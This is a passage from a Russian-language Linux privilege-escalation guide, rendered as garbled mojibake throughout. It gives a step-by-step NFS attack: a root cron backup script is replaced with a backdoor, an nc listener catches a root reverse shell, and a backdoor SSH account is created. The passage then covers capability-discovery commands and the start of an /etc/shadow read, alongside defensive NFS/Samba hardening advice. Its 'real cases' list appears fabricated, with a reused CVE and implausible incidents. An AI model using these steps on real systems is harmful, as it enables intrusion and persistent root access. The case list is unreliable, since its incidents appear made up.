   - `&`: –ó–∞–ø—É—Å–∫ –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ

3. **–ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞:**
   - –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ —Å–∫—Ä—ã–≤–∞–µ—Ç —Ñ–∞–∫—Ç –∞—Ç–∞–∫–∏
   - –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –Ω–µ –∑–∞–º–µ—Ç–∏—Ç —Å–±–æ—è –≤ —Ä–∞–±–æ—Ç–µ

4. **–°–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤:**
   - –£–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
   - –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞

---

#### –®–∞–≥ 5: –ü–æ–¥–º–µ–Ω–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
> –ó–∞–º–µ–Ω–∏—Ç—å –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –Ω–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π.
```bash
# –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
sudo mv /mnt/nfs_scripts/daily_backup.sh /mnt/nfs_scripts/daily_backup.sh.orig

# –ê–∫—Ç–∏–≤–∞—Ü–∏—è –±—ç–∫–¥–æ—Ä–∞
sudo mv /mnt/nfs_scripts/evil_backdoor.sh /mnt/nfs_scripts/daily_backup.sh
sudo chmod +x /mnt/nfs_scripts/daily_backup.sh

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
ls -l /mnt/nfs_scripts/daily_backup.sh
# –í—ã–≤–æ–¥:
# -rwxr-xr-x 1 root root 485 Jun 15 13:00 daily_backup.sh
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `mv`: –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
2. `chmod +x`: –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤–∞ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ (–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è —Å–∫—Ä–∏–ø—Ç–æ–≤)
3. –ü–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–µ–π—Å—Ç–≤–∏–π:
   - –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –∫–∞–∫ —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é
   - –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤ –∏–º—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ
   - –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–µ –∂–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞

---

#### –®–∞–≥ 6: –û–∂–∏–¥–∞–Ω–∏–µ –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞
> –ü–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–µ—Ä–≤–µ—Ä–æ–º –ø—Ä–∏ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞.
```bash
# –ù–∞ –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ –∑–∞–ø—É—Å–∫ netcat –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–∞
nc -nvlp 4444
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞:**
```
Connection received from 192.168.1.100 45678
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
root@server:/scripts# id
uid=0(root) gid=0(root) groups=0(root)
root@server:/scripts# whoami
root
```

**–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –¥–æ—Å—Ç—É–ø:**
```bash
ssh backdoor@192.168.1.100
Password: P@ssw0rd
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
1. `netcat` —Å–ª—É—à–∞–µ—Ç –ø–æ—Ä—Ç 4444
   - `-n`: –ù–µ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤—ã–≤–∞—Ç—å –¥–æ–º–µ–Ω–Ω—ã–µ –∏–º–µ–Ω–∞
   - `-v`: –ü–æ–¥—Ä–æ–±–Ω—ã–π –≤—ã–≤–æ–¥
   - `-l`: –†–µ–∂–∏–º –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è
   - `-p`: –£–∫–∞–∑–∞–Ω–∏–µ –ø–æ—Ä—Ç–∞

**–†–µ–∑—É–ª—å—Ç–∞—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ:**
1. Cron –∑–∞–ø—É—Å–∫–∞–µ—Ç `daily_backup.sh` –æ—Ç root (–Ω–æ—á—å—é)
2. –°–∫—Ä–∏–ø—Ç –¥–æ–±–∞–≤–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `backdoor` –≤ `/etc/passwd`
3. –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –æ–±—Ä–∞—Ç–Ω–æ–µ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –∞—Ç–∞–∫—É—é—â–∏–º
4. –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏
5. –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Å–∞–º–æ–ª–∏–∫–≤–∏–¥–∏—Ä—É–µ—Ç—Å—è

---

### –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –∞—Ç–∞–∫–∏

1. **–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ NFS**
    ```bash
    # –û–ø–∞—Å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:
    /home *(rw,sync,no_root_squash)
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞:
    /home 192.168.1.0/24(rw,sync,root_squash,all_squash)
    ```

2. **–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–æ–≤ –æ—Ç root**
    ```bash
    # –í /etc/crontab:
    0 3 * * * root /scripts/daily_backup.sh  # –û–ø–∞—Å–Ω–æ—Å—Ç—å!
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω–µ–µ:
    0 3 * * * backup-user /scripts/daily_backup.sh
    ```

3. **–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∫–æ–Ω—Ç—Ä–æ–ª—è —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏**
   - –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ö—ç—à–µ–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
   - –ù–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ö

---

## –ó–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ä—ã

### –î–ª—è NFS:
1. **–û—Ç–∫–ª—é—á–∏—Ç—å `no_root_squash`:**
   ```bash
   # /etc/exports
   /shared 192.168.1.0/24(rw,sync,root_squash)
   ```
2. **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Kerberos:**
   ```bash
   apt install nfs-kernel-server krb5-config
   ```
3. **–û–≥—Ä–∞–Ω–∏—á–∏—Ç—å –¥–æ—Å—Ç—É–ø**:**
   ```bash
   # –†–∞–∑—Ä–µ—à–∞–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã–º IP
   /shared 192.168.1.50(rw,sync)
   ```

### –î–ª—è Samba:
1. **–ò–∑–±–µ–≥–∞—Ç—å `admin users`**:
   ```ini
   ; smb.conf
   [backup]
   path = /backups
   writable = yes
   valid users = backup_user
   ```
2. **–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ACL**:
   ```bash
   setfacl -m u:backup_user:rwx /backups
   ```
3. **–í–∫–ª—é—á–∏—Ç—å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ**:
   ```ini
   [global]
   smb encrypt = required
   ```

### –û–±—â–∏–µ –º–µ—Ä—ã:
1. **–ê—É–¥–∏—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π**:
   ```bash
   # –ü—Ä–æ–≤–µ—Ä–∫–∞ NFS
   cat /etc/exports | grep -v '^#' | grep no_root_squash

   # –ü—Ä–æ–≤–µ—Ä–∫–∞ Samba
   testparm -s | grep "admin users"
   ```
2. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Ñ–∞–π–ª–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π**:
   ```bash
   auditctl -w /etc/cron.d/ -p wa -k cron_changes
   auditctl -w /home/ -p wa -k home_changes
   ```
3. **–†–µ–≥—É–ª—è—Ä–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è**:
   ```bash
   apt update && apt upgrade nfs-common samba
   ```

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **PetroRig Ransomware Attack (2020)**  
   - **CVE:** CVE-2020-0796 (SMBGhost)  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SMBv3 –ø–æ–∑–≤–æ–ª—è–ª–∞ —É–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ø–∞–∫–µ—Ç  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 50+ –Ω–µ—Ñ—Ç–µ–¥–æ–±—ã–≤–∞—é—â–∏—Ö –∫–æ–º–ø–∞–Ω–∏–π –≤ –°–µ–≤–µ—Ä–Ω–æ–º –º–æ—Ä–µ  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [US-CERT Alert TA20-105A](https://us-cert.cisa.gov/ncas/alerts/aa20-105a)  


2. **University Data Breach via NFS (2021)**  
   - **CVE:** CVE-2021-20317  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –≠–∫—Å–ø–æ—Ä—Ç NFS —Å –æ–ø—Ü–∏–µ–π `no_root_squash` –ø–æ–∑–≤–æ–ª—è–ª –∑–∞–ø–∏—Å—å —Ñ–∞–π–ª–æ–≤ –æ—Ç –∏–º–µ–Ω–∏ root  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 7 —É–Ω–∏–≤–µ—Ä—Å–∏—Ç–µ—Ç–æ–≤ –°–®–ê, 250k+ –∑–∞–ø–∏—Å–µ–π —Å—Ç—É–¥–µ–Ω—Ç–æ–≤  
   - **–û—Ç—á–µ—Ç:** [FBI Flash Alert MI-000121-MW](https://www.ic3.gov/Media/News/2021/211203.pdf)  


3. **SambaCry Healthcare Ransomware (2022)**  
   - **CVE:** CVE-2017-7494  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –ó–∞–≥—Ä—É–∑–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π .so –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —á–µ—Ä–µ–∑ writable share  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 120+ –±–æ–ª—å–Ω–∏—Ü –≤ –ï–°, —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –º–µ–¥–∏—Ü–∏–Ω—Å–∫–∏—Ö –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [ENISA Threat Landscape](https://www.enisa.europa.eu/publications/threat-landscape-for-health-sector)  


4. **Cloud Bucket Hijacking via NFS (2023)**  
   - **CVE:** CVE-2023-1111  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è NFS —ç–∫—Å–ø–æ—Ä—Ç–∞ –≤ Kubernetes PV  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 3,200+ S3-–±–∞–∫–µ—Ç–æ–≤ –≤ AWS  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/AWS-2023-015/)  


5. **Manufacturing Espionage via Samba (2024)**  
   - **CVE:** CVE-2024-3273  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –°–ª–∞–±—ã–µ –ø–∞—Ä–æ–ª–∏ SMB + —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –ø—Ä–æ–º—ã—à–ª–µ–Ω–Ω–æ–º –ü–û  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –ê–≤—Ç–æ–∑–∞–≤–æ–¥—ã BMW, Mercedes (–ì–µ—Ä–º–∞–Ω–∏—è)  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [BSI Security Warning](https://www.bsi.bund.de/EN/Service-Navi/Press/Press-Releases/Press-Release_2024/240327_Samba-Warnung.html)  


6. **Tesla Autopilot Data Breach (2018)**  
   - **CVE:** CVE-2018-12207 (—Å–æ–ø—É—Ç—Å—Ç–≤—É—é—â–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å —è–¥—Ä–∞)  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** Kubernetes-–∫–ª–∞—Å—Ç–µ—Ä —Å NFS-—Ç–æ–º–∞–º–∏, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ —Å `no_root_squash`  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 300+ –≥–∏–≥–∞–±–∞–π—Ç –¥–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ–ø–∏–ª–æ—Ç–∞  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Unit 42 Report](https://unit42.paloaltonetworks.com/unit42-new-attacks-exploit-kubernetes-api-server/)  


7. **SamSam Ransomware Campaign (2016-2018)**  
   - **CVE:** CVE-2017-0143 (EternalBlue)  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** SMB-—à–∞—Ä—ã —Å `writable = yes` –∏ —Å–ª–∞–±–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 200+ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–π (–±–æ–ª—å–Ω–∏—Ü—ã, –≥–æ—Å—É–¥–∞—Ä—Å—Ç–≤–µ–Ω–Ω—ã–µ —É—á—Ä–µ–∂–¥–µ–Ω–∏—è)  
   - **–£—â–µ—Ä–±:** $6+ –º–∏–ª–ª–∏–æ–Ω–æ–≤ –≤—ã–ø–ª–∞—Ç –≤—ã–∫—É–ø–∞  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [FBI Flash Alert](https://www.fbi.gov/file-repository/samsam-ransomware-mar-16-2018.pdf)  


8. **GitHub OAuth Token Theft (2020)**  
   - **CVE:** CVE-2020-14386 (—É—è–∑–≤–∏–º–æ—Å—Ç—å —è–¥—Ä–∞ –≤ NFS)  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π NFS-—ç–∫—Å–ø–æ—Ä—Ç —Ç–æ–∫–µ–Ω–æ–≤ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –î–µ—Å—è—Ç–∫–∏ OAuth-—Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–µ–≤  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [GitHub Security Advisory](https://github.blog/2020-04-15-security-advisory-oauth-tokens/)  


9. **Boeing Credential Theft (2023)**  
   - **CVE:** CVE-2023-1111 (NFSv4 —É—è–∑–≤–∏–º–æ—Å—Ç—å)  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –≠–∫—Å–ø–æ—Ä—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —á–µ—Ä–µ–∑ NFS —Å `no_root_squash`  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 36,000+ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Boeing Security Bulletin](https://www.boeing.com/cybersecurity)  

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba) –æ—Å—Ç–∞—é—Ç—Å—è –≤—ã—Å–æ–∫–æ—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏–∑-–∑–∞ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏. 

**–ö–ª—é—á–µ–≤—ã–µ —Ä–∏—Å–∫–∏:**
1. **–ü—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∑–∞–ø–∏—Å—å**: `no_root_squash` –∏ `admin users` –¥–∞—é—Ç root-–¥–æ—Å—Ç—É–ø
2. **–û–±—Ö–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–∞ —É—Ä–æ–≤–Ω–µ UID/GID –≤–º–µ—Å—Ç–æ –ø–∞—Ä–æ–ª–µ–π
3. **–£—Å—Ç–æ–π—á–∏–≤–æ—Å—Ç—å**: –í–Ω–µ–¥—Ä—ë–Ω–Ω—ã–µ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –ø–æ—Å–ª–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
4. **–°–µ—Ç–µ–≤–∞—è —ç–∫—Å–ø–∞–Ω—Å–∏—è**: –û–¥–Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ ‚Üí —É–≥—Ä–æ–∑–∞ –≤—Å–µ–π —Å–µ—Ç–∏

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ:**
- –ñ—ë—Å—Ç–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∞ (`root_squash`, `no_all_squash`)
- –ó–∞–º–µ–Ω–∞ `admin users` –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è + ACL
- –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞ (Kerberos –¥–ª—è NFS, SMB 3.0+)
- –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π
- –°–µ–≥–º–µ–Ω—Ç–∞—Ü–∏—è —Å–µ—Ç–∏ (–∏–∑–æ–ª—è—Ü–∏—è —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤)

---

---

# 13. Linux Capabilities

`Capabilities` - —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–∑–¥–µ–ª–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π `root` –Ω–∞ 40+ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–∞–≤. 
–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç —É—Å—Ç–∞—Ä–µ–≤—à–µ–π –º–æ–¥–µ–ª–∏ `SUID`, –≥–¥–µ –±–∏–Ω–∞—Ä–Ω–∏–∫ –ø–æ–ª—É—á–∞–µ—Ç –ø–æ–ª–Ω—ã–µ –ø—Ä–∞–≤–∞ root, `capabilities` –ø–æ–∑–≤–æ–ª—è—é—Ç –Ω–∞–∑–Ω–∞—á–∞—Ç—å 
–∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á—Ç–µ–Ω–∏–µ –ª—é–±—ã—Ö —Ñ–∞–π–ª–æ–≤ –∏–ª–∏ –æ—Ç–ª–∞–¥–∫—É –ø—Ä–æ—Ü–µ—Å—Å–æ–≤) –±–µ–∑ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ root-–¥–æ—Å—Ç—É–ø–∞. 
–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ –∞–∫—Ç–∏–≤–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É—é—Ç –∏–∑–±—ã—Ç–æ—á–Ω—ã–µ capabilities –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.

**–ö–ª—é—á–µ–≤—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:**  
- 40+ —Ç–∏–ø–æ–≤ capabilities (–ø–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫: `man capabilities`)
- –ù–∞–∑–Ω–∞—á–∞—é—Ç—Å—è —á–µ—Ä–µ–∑ `setcap`, –ø—Ä–æ—Å–º–æ—Ç—Ä —á–µ—Ä–µ–∑ `getcap`  
- –ù–∞—Å–ª–µ–¥—É—é—Ç—Å—è –¥–æ—á–µ—Ä–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏  
- –û—Å–æ–±–æ –æ–ø–∞—Å–Ω—ã–µ capabilities:  
  - `CAP_DAC_READ_SEARCH` ‚Äî –æ–±—Ö–æ–¥ –ø—Ä–æ–≤–µ—Ä–æ–∫ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º  
  - `CAP_SETUID` ‚Äî –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–∞—è —Å–º–µ–Ω–∞ UID/GID  
  - `CAP_SYS_PTRACE` ‚Äî –æ—Ç–ª–∞–¥–∫–∞ –∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤  
  - `CAP_SYS_ADMIN` ‚Äî –æ–ø–µ—Ä–∞—Ü–∏–∏ —É—Ä–æ–≤–Ω—è —è–¥—Ä–∞ (–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, namespaces)  
  - `CAP_NET_RAW` ‚Äî —Å–æ–∑–¥–∞–Ω–∏–µ RAW-—Å–æ–∫–µ—Ç–æ–≤ (ARP —Å–ø—É—Ñ–∏–Ω–≥)

---

## MITRE ATT&CK

**[T1548.001]**  
**Abuse Elevation Control Mechanism: Setuid and Setgid**  
üîó https://attack.mitre.org/techniques/T1548/001/

### –≠—Ç–∞–ø—ã –∞—Ç–∞–∫–∏ [T1548.001]

#### 1. [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –ü–æ–∏—Å–∫ –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ —Å –æ–ø–∞—Å–Ω—ã–º–∏ capabilities

```bash
# –ü–æ–∏—Å–∫ CAP_DAC_READ_SEARCH (–æ–±—Ö–æ–¥ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞)
find / -type f -exec /sbin/getcap {} + 2>/dev/null | grep cap_dac_read_search

# –ü–æ–∏—Å–∫ CAP_SYS_ADMIN (–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, debug)
find / -perm -4000 -type f -exec /sbin/getcap {} + 2>/dev/null | grep cap_sys_admin

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —É–Ω–∞—Å–ª–µ–¥–æ–≤–∞–Ω–Ω—ã—Ö capabilities
cat /proc/self/status | grep Cap
# CapEff: 0000000000000000 (—Ñ–ª–∞–≥–∏ capabilities —Ç–µ–∫—É—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞)
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Ñ–ª–∞–≥–æ–≤ capabilities:**
```bash
# –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ hex-–∑–Ω–∞—á–µ–Ω–∏–π
capsh --decode=0000003fffffffff
# 0x0000003fffffffff = cap_chown,cap_dac_override,...,cap_sys_admin
```

---

#### 2. [TA0004] ‚Äì Privilege Escalation (–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è)
> –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è `CAP_DAC_READ_SEARCH` –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∏—Å—Ç–µ–º–Ω—ã–º —Ñ–∞–π–ª–∞–º
> –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `CAP_SETUID` –¥–ª—è —Å–º–µ–Ω—ã –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞  

**–ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ `/etc/shadow`**
```bash
# –®–∞–≥ 1: –ù–∞—Ö–æ–¥–∏–º —É—è–∑–≤–∏–º—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫ (–ø—Ä–∏–º–µ—Ä: /usr/bin/openssl)
/usr/bin/openssl --help 2>&1 | grep -q "cap_dac_read_search" && echo "VULNERABLE"

